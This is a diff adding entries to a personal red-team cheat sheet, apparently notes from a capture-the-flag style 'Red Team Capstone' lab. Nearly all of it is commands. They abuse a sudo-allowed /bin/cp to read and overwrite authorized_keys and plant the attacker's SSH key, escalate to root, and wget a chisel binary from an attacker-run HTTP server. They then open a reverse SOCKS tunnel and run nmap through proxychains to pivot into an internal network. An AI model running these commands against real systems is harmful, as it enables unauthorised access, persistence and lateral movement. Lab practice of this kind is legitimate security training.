@@ -538,3 +538,61 @@ Linux SUID ls
 ###########
 
 find / -perm -u=s -type f -ls 2>/dev/null
+
+###########
+Linux SSH public key add - LFILE
+###########
+READTEAM CAPSTONE - VPN MACHINE
+sudo -l:
+    "it show us that we can check in file via" /bin/cp"
+        sudo /bin/cp /home/ubuntu/.ssh/authorized_keys /dev/stdout
+    We have the Authorized key
+    We also find root password
+
+    In Kali:
+        ssh-keygen -t rsa
+        we cat in the right file path 'id_rsa.pub'
+
+    We will add OUR RSA key to the Compromise Machine:
+        LFILE=/home/ubuntu/.ssh/authorized_keys                        
+        echo "ssh-rsa <our public key>" | sudo /bin/cp /dev/stdin "$LFILE"
+
+    In Kali:
+        ssh ubuntu@10.200.116.12 -i /home/kali/.ssh/id_rsa
+
+    Ubuntu SHell:
+        sudo -su root:
+            @root
+
+
+##########
+CHISEL PIVOTING + SCAN cf: REDTEAM CAPSTONE 
+##########
+Pivoting Chisel: https://github.com/jpillora/chisel/releases
+
+Pivoting with Chisel (Perform a successfull Nmap scan from Kali by passing through the COMPROMISE VPNMACHINE):
+In compromise Machine:
+    root@ip-10-200-116-12:/home# mkdir adib
+    root@ip-10-200-116-12:/home# ls
+    adib  ubuntu
+    root@ip-10-200-116-12:/home# cd adib
+    root@ip-10-200-116-12:/home/adib# 
+
+In Kali:
+    sudo python3 -m http.server
+    add the chisel bynari for linux:
+        https://github.com/jpillora/chisel/releases
+
+In Machine:
+    root@ip-10-200-116-12:/home/adib# wget http://10.50.113.14:8000/chisel
+    root@ip-10-200-116-12:/home/adib# chmod +x chisel
+                
+
+In Kali:
+    chisel server -p 8000 -reverse
+
+In Machine:
+    root@ip-10-200-116-12:/home/adib# ./chisel client <KaliIP:PORT> R:socks
+
+In Kali:
+proxychains nmap -sT -Pn 10.200.116.31
